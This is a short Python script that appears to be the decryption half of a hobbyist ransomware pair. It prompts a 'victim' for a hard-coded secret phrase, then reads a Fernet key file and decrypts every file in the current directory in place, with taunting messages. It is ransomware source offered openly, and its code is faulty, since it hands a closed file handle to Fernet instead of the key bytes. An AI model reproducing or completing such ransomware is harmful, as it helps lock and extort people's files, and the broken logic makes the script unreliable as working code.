#!/usr/bin/env python3

# importing important libraries

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "codeworm.py" or file == 'hackcode.py' or file == 'filekey.key':
        continue
    if os.path.isfile(file):
        files.append(file)
  
secreteKey = "h.a.c.k.a.n.d.c.o.d.e.s"

victim = input(str("Enter secrete key to get your files back\n"))
if victim == secreteKey:
    with open("filekey.key", "rb") as key:
        secreteKey= key.read()
        
    for file in files:
        with open(file, 'rb') as crpfile:
            contents = crpfile.read()
        decryption = Fernet(key).decrypt(contents)
        with open(file, 'wb') as corruptedFiles:
            corruptedFiles.write(decryption)
    print("Congrats... You got your files!")
else:
    print("sorry! Coffee was too small for me...")